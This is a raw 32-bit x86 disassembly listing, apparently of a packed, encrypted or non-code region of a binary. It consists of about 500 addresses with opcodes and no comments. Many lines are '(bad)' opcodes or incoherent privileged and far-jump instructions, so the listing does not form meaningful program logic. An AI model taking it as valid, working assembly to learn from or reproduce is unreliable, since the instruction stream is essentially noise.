  412335:	inc    eax
  412336:	cmp    al,0xac
  412338:	or     eax,0x1b531f69
  41233d:	sub    DWORD PTR [ebx],ebp
  41233f:	pusha  
  412340:	cmp    BYTE PTR [edi-0x3698f4af],al
  412346:	stos   BYTE PTR es:[edi],al
  412347:	sbb    eax,0x5ae99a20
  41234c:	fcmovu st,st(3)
  41234e:	mov    ds:0x76c7881a,eax
  412353:	test   BYTE PTR [eax+0x4c],ah
  412356:	and    cl,ah
  412358:	mov    cl,0x1
  41235a:	std    
  41235b:	push   edx
  41235c:	sub    eax,0x9aac217c
  412361:	xchg   DWORD PTR [edx+edx*2],edi
  412364:	stos   DWORD PTR es:[edi],eax
  412365:	push   ss
  412366:	ret    
  412367:	dec    edx
  412368:	stc    
  412369:	call   0x29b1f484
  41236e:	jecxz  0x412301
  412370:	ja     0x412313
  412372:	leave  
  412373:	adc    BYTE PTR [esi+0x37e09e9d],dh
  412379:	sub    eax,0x55ab1ce4
  41237e:	add    BYTE PTR [edx+0x25],ch
  412381:	cmp    eax,0x7390b389
  412386:	xchg   esi,eax
  412387:	pop    ds
  412388:	mov    al,ds:0xc2694bd
  41238d:	xor    al,0x91
  41238f:	mov    dl,cl
  412391:	bound  esp,QWORD PTR [edi]
  412393:	cmp    dh,BYTE PTR [ebp-0x5edaeee9]
  412399:	(bad)
  41239c:	inc    ebx
  41239d:	xchg   si,ax
  41239f:	add    eax,0x57e4c73
  4123a4:	jo     0x4123c3
  4123a6:	rcl    DWORD PTR [eax],1
  4123a8:	into   
  4123a9:	retf   0x1087
  4123ac:	cmc    
  4123ad:	pop    eax
  4123ae:	cmp    cl,ch
  4123b0:	mov    bl,0x21
  4123b2:	sub    eax,DWORD PTR [ebx+0x64]
  4123b5:	jl     0x4123c5
  4123b7:	je     0x41238a
  4123b9:	adc    eax,0xe13c4cbf
  4123be:	mov    DWORD PTR [esi-0x4],ecx
  4123c1:	add    ah,0xc5
  4123c4:	mov    edi,0x3ef64bb8
  4123c9:	stos   BYTE PTR es:[edi],al
  4123ca:	adc    al,0x55
  4123cc:	xor    ch,BYTE PTR [edx-0x524c9d4]
  4123d2:	or     al,0x25
  4123d4:	test   DWORD PTR [eax+0x7b],eax
  4123d7:	mov    ah,0xe
  4123d9:	leave  
  4123da:	mov    ch,ch
  4123dc:	mov    eax,ds:0x20cad1b1
  4123e1:	push   cs
  4123e2:	jo     0x4123b8
  4123e4:	dec    ebx
  4123e5:	mov    ds:0xf67cc61e,al
  4123ea:	clc    
  4123eb:	add    DWORD PTR [edx+ebp*4],esp
  4123ee:	ins    DWORD PTR es:[edi],dx
  4123ef:	out    0x1e,eax
  4123f1:	cmc    
  4123f2:	(bad)  
  4123f3:	or     eax,DWORD PTR [edi-0x30f3238e]
  4123f9:	fs mov ebx,0x40809d3e
  4123ff:	call   FWORD PTR [edi]
  412401:	shl    DWORD PTR ds:0xfdf935df,cl
  412407:	inc    eax
  412408:	xchg   edi,eax
  412409:	or     eax,0x9ef41b98
  41240e:	outs   dx,BYTE PTR ds:[esi]
  41240f:	pop    edx
  412410:	mov    eax,DWORD PTR [edx+0x79]
  412413:	fs xchg edx,eax
  412415:	pop    ebx
  412416:	rcl    ah,0x92
  412419:	dec    ebp
  41241a:	cld    
  41241b:	jns    0x4123d1
  41241d:	sti    
  41241e:	push   cs
  41241f:	dec    esp
  412420:	and    bh,BYTE PTR ds:0xf204860e
  412426:	ficomp WORD PTR [esi+esi*1]
  412429:	jge    0x412475
  41242b:	mov    ebx,0xe4d5d840
  412430:	retf   
  412431:	outs   dx,DWORD PTR ds:[esi]
  412432:	push   ebp
  412433:	push   ss
  412434:	retf   0x6e0c
  412437:	fiadd  DWORD PTR [ebx]
  412439:	pop    esi
  41243a:	xchg   ebx,eax
  41243b:	mov    esp,0x1706fdfc
  412440:	push   es
  412441:	mov    BYTE PTR [edx-0x31151dca],0xd7
  412448:	xchg   edi,edx
  41244a:	mov    dh,0x10
  41244c:	pop    ecx
  41244d:	retf   
  41244e:	cmp    edi,DWORD PTR [edi-0x4]
  412451:	dec    edx
  412452:	lahf   
  412453:	(bad)  
  412454:	sbb    BYTE PTR [esp+ecx*8+0x61],dl
  412458:	jmp    0xa81:0xf0911ca1
  41245f:	cmp    DWORD PTR [ebx],edi
  412461:	fsubp  st(3),st
  412463:	pushf  
  412464:	lahf   
  412465:	push   esi
  412466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412467:	stc    
  412468:	or     ecx,DWORD PTR [edi+0x99b948]
  41246e:	test   BYTE PTR ds:0xe08e707c,bl
  412474:	clc    
  412475:	es xor DWORD PTR ss:[eax-0x76],edi
  41247a:	in     al,0xc7
  41247c:	mov    bl,0x10
  41247e:	jmp    DWORD PTR [esi+esi*2-0x56]
  412482:	bound  esp,QWORD PTR [edx-0x1d]
  412485:	nop
  412486:	mov    ds:0x37131541,al
  41248b:	(bad)  
  41248c:	dec    ebp
  41248d:	mov    ebp,0x1fcc0d61
  412492:	or     cl,BYTE PTR [esi+ebx*8+0x6e]
  412496:	ds retf 0xe7f3
  41249a:	mov    DWORD PTR [esi],eax
  41249c:	nop
  41249d:	fwait
  41249e:	xor    bl,BYTE PTR [esi]
  4124a0:	retf   
  4124a1:	lahf   
  4124a2:	aad    0x0
  4124a4:	mov    esp,0xa7215cbb
  4124a9:	out    dx,eax
  4124aa:	inc    esi
  4124ab:	xor    eax,0x3e6f4673
  4124b0:	mov    bl,0x4
  4124b2:	arpl   bp,si
  4124b4:	pop    ebp
  4124b5:	scas   al,BYTE PTR es:[edi]
  4124b6:	cmc    
  4124b7:	sub    eax,0xc9de4af0
  4124bc:	dec    edx
  4124bd:	xchg   ebx,eax
  4124be:	aam    0x7
  4124c0:	in     al,dx
  4124c1:	in     al,0x8b
  4124c3:	dec    esi
  4124c4:	in     eax,0xb0
  4124c6:	push   ss
  4124c7:	pop    ebx
  4124c8:	xchg   esp,eax
  4124c9:	imul   ebx,edi,0xffffffde
  4124cc:	or     bh,0x47
  4124cf:	stc    
  4124d0:	pop    ecx
  4124d1:	mov    ch,0x94
  4124d3:	and    al,0x92
  4124d5:	push   ecx
  4124d6:	je     0x412458
  4124d8:	sbb    eax,0x98c550bf
  4124dd:	fldenv [ebx-0x5f]
  4124e0:	mov    bh,0xdb
  4124e2:	stc    
  4124e3:	mov    esi,0x140217c3
  4124e8:	inc    eax
  4124e9:	xor    al,0xe9
  4124eb:	outs   dx,BYTE PTR cs:[esi]
  4124ed:	aas    
  4124ee:	cmp    edi,ecx
  4124f0:	xchg   edi,eax
  4124f1:	xchg   ecx,eax
  4124f2:	aad    0x8b
  4124f4:	aas    
  4124f5:	shl    BYTE PTR [esi+0x8],0x14
  4124f9:	jle    0x412525
  4124fb:	idiv   DWORD PTR [ecx]
  4124fd:	ins    DWORD PTR es:[edi],dx
  4124fe:	fcom   QWORD PTR [ebx-0x61]
  412501:	push   eax
  412502:	arpl   bx,dx
  412504:	jl     0x4124bc
  412506:	or     edi,eax
  412508:	cmp    eax,0x53bb572e
  41250d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41250e:	clc    
  41250f:	pop    esi
  412510:	js     0x41252d
  412512:	mul    DWORD PTR [edi+0x6e]
  412515:	cmp    bh,BYTE PTR [esi]
  412517:	sahf   
  412518:	jno    0x4124bd
  41251a:	fstp   QWORD PTR [edx+0x12d2b9c2]
  412520:	(bad)  
  412521:	lods   eax,DWORD PTR ds:[esi]
  412522:	jg     0x41254e
  412524:	repnz lock cmc 
  412527:	ja     0x41255c
  412529:	and    bl,BYTE PTR [ebx+0x513b1cf2]
  41252f:	in     eax,0x25
  412531:	sahf   
  412532:	sbb    bl,BYTE PTR [edx+0x52]
  412535:	adc    edi,DWORD PTR [edi-0x4ed13067]
  41253b:	iret   
  41253c:	mov    ebp,0x35d7d323
  412541:	jecxz  0x412560
  412543:	inc    edi
  412544:	pushf  
  412545:	jmp    0x4124ec
  412547:	les    ebx,FWORD PTR [esi]
  412549:	sub    BYTE PTR cs:[edx-0x65e8e3ce],bl
  412550:	mov    eax,ds:0xd911b1df
  412555:	mov    al,ds:0x175c8a26
  41255a:	jmp    0x41254f
  41255c:	test   BYTE PTR [edi],bh
  41255e:	sbb    ebx,ebp
  412560:	mov    ds:0x6562fb7f,eax
  412565:	sub    dh,BYTE PTR [eax]
  412567:	mov    ds:0xb343bdf1,eax
  41256c:	mov    esi,0xb3860d6
  412571:	mov    dh,0xdd
  412573:	pop    esp
  412574:	dec    ebx
  412575:	cli    
  412576:	js     0x412504
  412578:	clc    
  412579:	test   esp,ebx
  41257b:	daa    
  41257c:	(bad)  
  41257d:	rcl    DWORD PTR [ecx+0x50ffde33],0xd0
  412584:	xchg   edx,eax
  412585:	and    BYTE PTR [eax],dl
  412587:	cdq    
  412588:	js     0x41259a
  41258a:	loope  0x41256d
  41258c:	imul   ebx,DWORD PTR [eax+esi*8+0x73],0xffdf4056
  412594:	jl     0x412533
  412596:	pop    ss
  412597:	mov    bl,0x2d
  412599:	push   esi
  41259a:	aam    0x3e
  41259c:	sbb    BYTE PTR [edx],0x4f
  41259f:	push   eax
  4125a0:	or     dh,0x6e
  4125a3:	ins    DWORD PTR es:[edi],dx
  4125a4:	mov    WORD PTR [ebx+ebx*4],es
  4125a7:	jno    0x4125ab
  4125a9:	cli    
  4125aa:	adc    cl,BYTE PTR [ecx]
  4125ac:	pop    ds
  4125ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ae:	mov    ebp,0xfa312a49
  4125b3:	(bad)  
  4125b4:	cmp    eax,0xa9c607c
  4125b9:	(bad)  
  4125ba:	clc    
  4125bb:	gs fs add al,0xf0
  4125bf:	and    ebp,DWORD PTR [edx]
  4125c1:	or     al,0xbe
  4125c3:	aaa    
  4125c4:	std    
  4125c5:	and    ebp,DWORD PTR [ecx+0x31d70bd8]
  4125cb:	retf   0x8c4c
  4125ce:	dec    edi
  4125cf:	dec    esp
  4125d0:	fiadd  DWORD PTR [ecx+0x3c33708b]
  4125d6:	pop    eax
  4125d7:	or     bl,BYTE PTR [edx+0x7c]
  4125da:	or     BYTE PTR [eax+0x70],ch
  4125dd:	jecxz  0x4125ad
  4125df:	and    al,0x75
  4125e1:	in     eax,0x9
  4125e3:	push   eax
  4125e4:	clc    
  4125e5:	sub    eax,0xb61a85a1
  4125ea:	ficomp WORD PTR [edx-0x4f]
  4125ed:	xchg   ebp,eax
  4125ee:	jno    0x412578
  4125f0:	shl    dl,cl
  4125f2:	(bad)  
  4125f3:	mov    al,ds:0x9b537883
  4125f8:	push   ebp
  4125f9:	mov    cl,0x87
  4125fb:	fcmove st,st(5)
  4125fd:	jl     0x412605
  4125ff:	xchg   edi,eax
  412600:	or     bh,ch
  412602:	and    BYTE PTR [edi+0x34],0xa3
  412606:	dec    ebp
  412607:	sub    eax,0x95e7fd6b
  41260c:	sbb    eax,0xa37a23fa
  412611:	adc    esi,DWORD PTR [esp+ebx*1-0x44]
  412615:	mov    edx,0x8a148bd3
  41261a:	repz sbb BYTE PTR [edi+ebx*1+0x77],bl
  41261f:	pop    eax
  412620:	in     al,dx
  412621:	jle    0x412601
  412623:	sub    eax,0xdae019a3
  412628:	mov    BYTE PTR [edx],ch
  41262a:	inc    esp
  41262b:	xchg   DWORD PTR [esi+0x2b3ee4a0],edi
  412631:	jle    0x4125d4
  412633:	inc    edi
  412634:	pusha  
  412635:	(bad)  
  412636:	fistp  QWORD PTR [edx+0x30e2df44]
  41263c:	sbb    al,0x4b
  41263e:	mov    BYTE PTR [edi+0x2410d1f4],al
  412644:	jmp    0x4dfdd39d
  412649:	mov    ecx,DWORD PTR [ebx]
  41264b:	jb     0x412651
  41264d:	std    
  41264e:	push   0x12
  412650:	in     al,dx
  412651:	inc    ecx
  412652:	in     eax,dx
  412653:	pop    esp
  412654:	mov    al,0x2f
  412656:	and    ch,bl
  412658:	shl    BYTE PTR [edi-0x5ff8fb0],0x72
  41265f:	dec    esp
  412660:	not    DWORD PTR [ecx+0x25c3812c]
  412666:	loopne 0x412685
  412668:	xor    eax,0xbf2e7637
  41266d:	inc    ebx
  41266e:	or     ah,BYTE PTR [ecx+0x514a4a17]
  412674:	dec    eax
  412675:	inc    edx
  412676:	sbb    eax,DWORD PTR [eax-0x17]
  412679:	mov    edi,0xcf00db27
  41267e:	sbb    eax,0x1f4ec5d1
  412683:	push   DWORD PTR [edi]
  412685:	pop    ds
  412686:	mov    ss,WORD PTR es:[eax+edi*1-0x7a3b5179]
  41268e:	dec    edi
  41268f:	adc    BYTE PTR [ecx+0x19],0x8e
  412693:	fld    DWORD PTR [edi+0x4d]
  412696:	sub    eax,0xa31846a0
  41269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269c:	xchg   DWORD PTR [di-0x74d9],ebx
  4126a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126a2:	fwait
  4126a3:	scas   al,BYTE PTR es:[edi]
  4126a4:	mov    DWORD PTR [esp+esi*2],eax
  4126a7:	jns    0x412629
  4126a9:	mov    ebp,DWORD PTR [ecx-0x62]
  4126ac:	jnp    0x41268c
  4126ae:	dec    eax
  4126af:	dec    eax
  4126b0:	loope  0x4126d8
  4126b2:	cmp    DWORD PTR [ebx+0x48286e1b],ebx
  4126b8:	lods   eax,DWORD PTR ds:[esi]
  4126b9:	sub    cl,BYTE PTR [ecx-0x4f]
  4126bc:	xchg   ebx,eax
  4126bd:	jne    0x412734
  4126bf:	sbb    DWORD PTR [ebp+0x49],edi
  4126c2:	int    0x5
  4126c4:	retf   0xcf89
  4126c7:	in     al,0x6f
  4126c9:	jle    0x4126d2
  4126cb:	mov    eax,ds:0xec349d46
  4126d0:	jbe    0x412723
  4126d2:	mov    ds:0x8f1a8cee,al
  4126d7:	(bad)  
  4126d9:	mov    DWORD PTR [eax+eax*4+0x52],edi
  4126dd:	lods   eax,DWORD PTR ds:[esi]
  4126de:	add    dh,cl
  4126e0:	cld    
  4126e1:	xchg   edx,eax
  4126e2:	push   0x4044992b
  4126e7:	mov    DWORD PTR [esi+edx*8-0x79],ecx
  4126eb:	jb     0x4126ca
  4126ed:	add    cl,bl
  4126ef:	adc    eax,0x890e2608
  4126f4:	cld    
  4126f5:	iret   
  4126f6:	and    ebx,eax
  4126f8:	int3   
  4126f9:	mov    DWORD PTR [edi],edi
  4126fb:	dec    edi
  4126fc:	aaa    
  4126fd:	shl    DWORD PTR [ecx+ecx*2],1
  412700:	mov    edx,0x620ff2e9
  412705:	pop    edx
  412706:	fwait
  412707:	test   al,0xa6
  412709:	and    eax,0xc741ebc1
  41270e:	ins    BYTE PTR es:[di],dx
  412710:	dec    ebx
  412711:	mov    cl,BYTE PTR [ecx+edx*2]
  412714:	xlat   BYTE PTR ds:[ebx]
  412715:	jge    0x4126c5
  412717:	cld    
  412718:	test   BYTE PTR [edx-0x32f94402],cl
  41271e:	or     al,0xad
  412720:	call   0x3be5:0x117dd12b
  412727:	mov    WORD PTR [edi+0x50],?
  41272a:	addr16 ret 0x5f32
  41272e:	jae    0x412724
  412730:	out    dx,al
  412731:	adc    eax,0x9a4f399b
  412736:	pop    eax
  412737:	xchg   edx,eax
  412738:	inc    ebp
  412739:	adc    al,0xae
  41273b:	add    BYTE PTR [edx+0x1f],0x36
  41273f:	mov    ebp,DWORD PTR [eax-0x69]
  412742:	sub    BYTE PTR cs:[eax],ah
  412745:	sbb    ecx,DWORD PTR [eax+ecx*2+0x80d9ce4]
  41274c:	mov    ecx,0x6154c70a
  412751:	add    DWORD PTR [ebp+0x7a],edi
  412754:	jmp    0xa067:0xc2cb03b7
  41275b:	and    edx,ebp
  41275d:	xor    DWORD PTR [edx+esi*4-0x6396ad2c],eax
  412764:	sahf   
  412765:	loope  0x412714
  412767:	fadd   st,st(3)
  412769:	shl    DWORD PTR [edx],cl
  41276b:	dec    esp
  41276c:	pop    esp
  41276d:	mov    al,BYTE PTR [edi-0x5f24a7b]
  412773:	bnd jle 0x4127a3
  412776:	js     0x412719
  412778:	(bad)  
  412779:	fisub  WORD PTR [ecx-0x4e]
  41277c:	adc    eax,0xcda4a461
  412781:	xchg   edx,eax
  412782:	dec    ebp
  412783:	xor    eax,0x36a56b6e
  412788:	add    BYTE PTR [edi],cl
  41278a:	les    ebx,FWORD PTR [ecx]
  41278c:	sbb    al,0xa3
  41278e:	pop    ds
  41278f:	push   esp
  412790:	push   0x3eecf535
  412795:	outs   dx,BYTE PTR ds:[esi]
  412796:	mov    ds:0xd54efb39,eax
  41279b:	inc    eax
  41279c:	sub    ecx,edx
  41279e:	rcr    DWORD PTR [eax+0x6f25a3a4],0xa3
  4127a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a6:	jmp    0x1a90:0xa6b216dc
  4127ad:	mov    DWORD PTR [esi],edi
  4127af:	jp     0x412822
  4127b1:	jge    0x41274e
  4127b3:	cli    
  4127b4:	xor    ch,dl
  4127b6:	dec    ecx
  4127b7:	call   0xe3ccc2d7
  4127bc:	mov    ch,BYTE PTR [edi-0x1f]
  4127bf:	sub    edx,eax
  4127c1:	jmp    DWORD PTR ds:0xca4d8b70
  4127c7:	mov    ch,0xc
  4127c9:	sbb    DWORD PTR [eax],0x2fee7633
  4127cf:	inc    esi
  4127d0:	test   DWORD PTR [edx+0x43904012],esp
  4127d6:	add    al,0x69
  4127d8:	push   0xb2a47c
  4127dd:	fwait
  4127de:	xor    dl,bh
  4127e0:	add    BYTE PTR [ecx],cl
  4127e2:	loopne 0x4127b8
  4127e4:	fs push esp
  4127e6:	mov    ah,cl
  4127e8:	outs   dx,BYTE PTR ds:[esi]
  4127e9:	cdq    
  4127ea:	or     al,0x9a
  4127ec:	add    cl,BYTE PTR [ebp+0x22090ea5]
  4127f2:	mov    ecx,0xcdf00f5e
  4127f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127f8:	pushf  
  4127f9:	lds    edx,FWORD PTR [ebx-0x7c31b98e]
  4127ff:	adc    al,0x23
  412801:	mov    eax,ds:0xfaac3379
  412806:	clc    
  412807:	cmp    ebp,DWORD PTR [ebx+esi*1-0x32]
  41280b:	(bad)  [esp+ebp*1-0x32]
  41280f:	adc    BYTE PTR [eax+0x35],bh
  412812:	add    ah,ah
  412814:	lahf   
  412815:	jbe    0x412882
  412817:	lock push 0xda435a06
  41281d:	adc    DWORD PTR [eax+0x2d397ed],ecx
  412823:	es pop ecx
  412825:	les    ebp,FWORD PTR fs:[edx+0x3100b07f]
  41282c:	jge    0x4127f3
  41282e:	(bad)  
  41282f:	sbb    DWORD PTR [ecx-0x74456df9],esp
  412835:	cwde   
  412836:	js     0x412856
  412838:	rol    edx,1
  41283a:	cmp    eax,0x3c2bc428
  41283f:	mov    ah,0x13
  412841:	inc    ebx
  412842:	dec    ebp
  412843:	fmul   QWORD PTR [eax]
  412845:	in     eax,0xe7
  412847:	in     eax,0x6a
  412849:	cld    
  41284a:	sub    bh,bh
  41284c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41284d:	mov    bh,0xd7
  41284f:	in     al,dx
  412850:	int    0x85
  412852:	xor    ah,0x4a
  412855:	hlt    
  412856:	data16 jb 0x412861
  412859:	(bad)  
  41285a:	scas   eax,DWORD PTR es:[edi]
  41285b:	sub    DWORD PTR [esi+0x3],edi
  41285e:	jecxz  0x4127fb
  412860:	cmc    
  412861:	pop    ds
  412862:	jle    0x41284e
  412864:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412866:	fbld   TBYTE PTR [eax]
  412868:	sti    
  412869:	jno    0x412867
  41286b:	mov    dl,0xf2
  41286d:	bound  ebp,QWORD PTR [edx]
  41286f:	bound  esp,QWORD PTR [edi]
  412871:	bnd jg 0x4128c7
  412874:	add    eax,0x9091269
  412879:	ins    DWORD PTR es:[edi],dx
  41287a:	rol    dh,cl
  41287c:	mov    ah,0x28
  41287e:	jmp    0xaa5a3f17
  412883:	clc    
  412884:	xchg   ebp,eax
  412885:	mov    esi,0x5fdacfdf
  41288a:	sar    DWORD PTR gs:[ecx+ebp*8+0x1787607],1
  412892:	pop    esp
  412893:	dec    esi
  412894:	pop    DWORD PTR [edi+0x21]
  412897:	xlat   BYTE PTR ds:[ebx]
  412898:	push   ecx
  412899:	fcom   QWORD PTR [edi+0x1d]
  41289c:	jmp    0x955eee0c
  4128a1:	lock jo 0x4128ce
  4128a4:	rcl    DWORD PTR [esi+0x16],0xaf
  4128a8:	sbb    esi,DWORD PTR [esi]
  4128aa:	lea    edi,[eax]
  4128ac:	and    al,0x85
  4128ae:	xchg   ebx,eax
  4128af:	in     eax,dx
  4128b0:	sub    BYTE PTR [edi-0x62],ch
  4128b3:	jmp    0xbe1f98df
  4128b8:	inc    DWORD PTR [ecx+0x235bfa22]
  4128be:	mov    al,ds:0xd6be01cb
  4128c3:	lahf   
  4128c4:	add    al,0xdb
  4128c6:	fxch   st(3)
  4128c8:	cs push ebx
  4128ca:	fadd   QWORD PTR [ebp+0x4c]
  4128cd:	sbb    BYTE PTR [ebx+0x1ace9abb],dl
  4128d3:	stc    
  4128d4:	dec    eax
  4128d5:	pop    es
  4128d6:	daa    
  4128d7:	push   ss
  4128d8:	loopne 0x41291f
  4128da:	in     al,0xe3
  4128dc:	add    al,0xa7
  4128de:	xor    al,0x4
  4128e0:	adc    esp,DWORD PTR [ebx+0x3f]
  4128e3:	xlat   BYTE PTR ds:[ebx]
  4128e4:	add    BYTE PTR [edx-0x6162be6a],al
  4128ea:	mov    ds:0xcc4555cd,eax
  4128ef:	adc    BYTE PTR [edi+0x31fdf0df],bh
  4128f5:	xchg   ebp,eax
  4128f6:	mov    esp,0xfca1600e
  4128fb:	cdq    
  4128fc:	pushf  
  4128fd:	dec    esi
  4128fe:	cmp    eax,0x9d0e435a
  412903:	cmp    ah,BYTE PTR [ecx-0x70]
  412906:	repz (bad) 
  412908:	into   
  412909:	inc    ebp
  41290a:	sub    ecx,esp
  41290c:	faddp  st(5),st
  41290e:	jo     0x4128c7
  412910:	(bad)  
  412911:	fnstenv [ebx]
  412913:	aam    0x1e
  412915:	dec    esi
  412916:	sbb    ecx,ebx
  412918:	popf   
  412919:	push   cs
  41291a:	cli    
  41291b:	cs loopne 0x4128d7
  41291e:	repz xchg ecx,eax
  412920:	pop    edi
  412921:	lahf   
  412922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412923:	fdiv   st,st(6)
  412925:	test   eax,0x752f144d
  41292a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292b:	xchg   ecx,eax
  41292c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41292d:	daa    
  41292e:	or     al,0xcb
  412930:	out    0xf9,eax
  412932:	jecxz  0x4128d2
  412934:	sbb    ebp,edx
  412936:	mov    edi,0xb8e31744
  41293b:	jge    0x41298a
  41293d:	pop    ecx
  41293e:	xor    BYTE PTR [esi-0x1fd8473d],dh
  412944:	retf   0xcb65
  412947:	adc    al,BYTE PTR [eax]
  412949:	or     dl,BYTE PTR [ecx+0x59b51816]
  41294f:	or     al,0xea
  412951:	jnp    0x412937
  412953:	mov    fs,WORD PTR [ebx-0x1]
  412956:	inc    edx
  412957:	and    BYTE PTR [edi],ch
  412959:	dec    edi
  41295a:	xor    ah,al
  41295c:	ret    0x2596
  41295f:	add    eax,0x6b8a1567
  412964:	push   edx
  412965:	mov    edi,0x6535af3d
  41296a:	or     bl,bh
  41296c:	xchg   DWORD PTR [ecx+0x42],esp
  41296f:	mov    bl,0xb6
  412971:	std    
  412972:	nop
  412973:	push   esp
  412974:	stos   DWORD PTR es:[edi],eax
  412975:	(bad)  
  412977:	adc    esi,DWORD PTR ds:0x115520a3
  41297d:	adc    cl,dl
  41297f:	in     eax,0x96
  412981:	fild   DWORD PTR [ebp+ebx*4+0x7fdeef01]
  412988:	add    cl,BYTE PTR [eax+edx*2+0x2658909d]
  41298f:	fld    st(2)
  412991:	fcomi  st,st(4)
  412993:	loop   0x41291e
  412995:	sub    esi,DWORD PTR [edx]
  412997:	daa    
  412998:	std    
  412999:	mov    ecx,edi
  41299b:	out    dx,eax
  41299c:	retf   0x6757
  41299f:	push   0x3b
  4129a1:	mov    eax,eax
  4129a3:	test   eax,0x4148cbad
  4129a8:	inc    edx
  4129a9:	lahf   
  4129aa:	dec    DWORD PTR [ecx]
  4129ac:	dec    edi
  4129ad:	mov    dh,0xd0
  4129af:	in     eax,0x4
  4129b1:	mov    ds:0xd023875f,al
  4129b6:	les    edi,FWORD PTR [ebx-0x31]
  4129b9:	call   0x3968:0xc6a66d0
  4129c0:	jmp    0xc579185c
  4129c5:	or     cl,BYTE PTR [edx-0x2]
  4129c8:	sbb    eax,DWORD PTR [eax]
  4129ca:	fwait
  4129cb:	mov    cl,0x6
  4129cd:	xor    ebp,ebx
  4129cf:	pushf  
  4129d0:	scas   eax,DWORD PTR es:[edi]
  4129d1:	sar    BYTE PTR [eax],1
  4129d3:	sub    DWORD PTR [eax+0x31],edx
  4129d6:	and    esp,esi
  4129d8:	jge    0x412a09
  4129da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129db:	call   0x8665:0x4a4770ef
  4129e2:	sub    eax,0x4be8538c
  4129e7:	adc    al,0x78
  4129e9:	inc    ebp
  4129ea:	dec    esp
  4129eb:	lods   al,BYTE PTR ds:[esi]
  4129ec:	out    dx,al
  4129ed:	mov    dh,0x7
  4129ef:	adc    esi,ecx
  4129f1:	jbe    0x412a04
  4129f3:	idiv   edx
  4129f5:	(bad)  
  4129f6:	jecxz  0x4129dc
  4129f8:	aas    
  4129f9:	(bad)  
  4129fa:	popf   
  4129fb:	lds    cx,DWORD PTR [edi]
  4129fe:	inc    edi
  4129ff:	xchg   esp,eax
  412a00:	cmp    eax,esi
  412a02:	mov    bl,0x49
  412a04:	xchg   ebp,ebp
  412a06:	sub    DWORD PTR [ebx-0x63fb2aad],edx
  412a0c:	fidivr WORD PTR [ecx]
  412a0e:	std    
  412a0f:	test   eax,0xbe3d0a76
  412a14:	mov    ecx,eax
  412a16:	int    0x79
  412a18:	inc    esp
  412a19:	fadd   QWORD PTR [ebx-0x186cf1b2]
  412a1f:	loopne 0x4129fb
  412a21:	inc    edi
  412a22:	xchg   ecx,eax
  412a23:	gs imul ecx,edi,0xf9ef1af1
  412a2a:	fcomp  QWORD PTR [esi]
  412a2c:	xchg   ecx,eax
  412a2d:	imul   eax,DWORD PTR [edi],0x7dc398f9
  412a33:	and    BYTE PTR [ebx+0x78],0x24
  412a37:	dec    edx
  412a38:	add    ebp,ebx
  412a3a:	and    al,cl
  412a3c:	repz fs push esi
  412a3f:	dec    eax
  412a40:	jp     0x412aac
  412a42:	mov    al,0xc5
  412a44:	fwait
  412a45:	and    DWORD PTR [edi+0x69d18b82],0x494cdd86
  412a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a50:	push   0x1f
  412a52:	add    dl,ah
  412a54:	cwde   
  412a55:	test   DWORD PTR [edi+eiz*4+0x23a683e6],0x38cc13a0
  412a60:	jecxz  0x412a30
  412a62:	es jge 0x412a05
  412a65:	or     ebx,edi
  412a67:	ss xchg edx,eax
  412a69:	jnp    0x412a0a
  412a6b:	addr16 in eax,dx
  412a6d:	jne    0x412a75
  412a6f:	test   BYTE PTR [esi-0x27aca52f],al
  412a75:	dec    edx
  412a76:	cmp    edx,DWORD PTR [ebx+0x5fda7d31]
  412a7c:	cmp    ah,ah
  412a7e:	ins    BYTE PTR es:[edi],dx
  412a7f:	stc    
  412a80:	loope  0x412a6d
  412a82:	das    
  412a83:	mov    dl,BYTE PTR [ebp+0x1a]
  412a86:	mov    bh,0x3
  412a88:	dec    esp
  412a89:	fnsave [esi]
  412a8b:	mov    ecx,0xf065dd28
  412a90:	or     al,BYTE PTR [ebp-0x577d092c]
  412a96:	push   esp
  412a97:	jg     0x412a88
  412a99:	push   cs
  412a9a:	js     0x412aa6
  412a9c:	mov    al,0xe
  412a9e:	or     BYTE PTR [ebp-0x5002bed],0x1c
  412aa5:	sbb    al,BYTE PTR [eax]
  412aa7:	sub    eax,0x1e107ba3
  412aac:	shl    DWORD PTR [edx+0x1e],cl
  412aaf:	rcr    esi,cl
  412ab1:	push   0x3b173fbf
  412ab6:	dec    edx
  412ab7:	sub    al,0xb7
  412ab9:	jmp    0xd0a9:0xe0aa4621
  412ac0:	adc    eax,0x9f7e7672
  412ac5:	xchg   esi,eax
  412ac6:	xor    eax,edi
  412ac8:	dec    ebx
  412ac9:	lock sbb bh,BYTE PTR [edx+0x1d814c34]
  412ad0:	lea    esi,[edi+esi*2+0x1d8dd8bf]
  412ad7:	gs mov ecx,0xd6084301
  412add:	or     cl,BYTE PTR [ecx+ecx*2-0x37813837]
  412ae4:	jno    0x412b1d
  412ae6:	jecxz  0x412aa3
  412ae8:	mov    cl,0xfd
  412aea:	(bad)  
  412aec:	lods   eax,DWORD PTR ds:[esi]
  412aed:	jbe    0x412aae
  412aef:	and    dh,BYTE PTR [ecx+0x40]
  412af2:	scas   al,BYTE PTR es:[edi]
  412af3:	(bad)  
  412af5:	pop    esi
  412af6:	fcmove st,st(6)
  412af8:	fld    TBYTE PTR [ecx+0x3fdbe37f]
  412afe:	lock pop es
  412b00:	adc    edi,esi
  412b02:	mov    WORD PTR ds:0xf4b69636,ds
  412b08:	ficomp DWORD PTR [edi+0x3f]
  412b0b:	and    BYTE PTR [ebx+0x49aca543],bh
  412b11:	mov    ds:0xe1650dea,eax
  412b16:	jecxz  0x412b70
  412b18:	push   esp
  412b19:	xchg   esp,eax
  412b1a:	pop    ebx
  412b1b:	pop    ebp
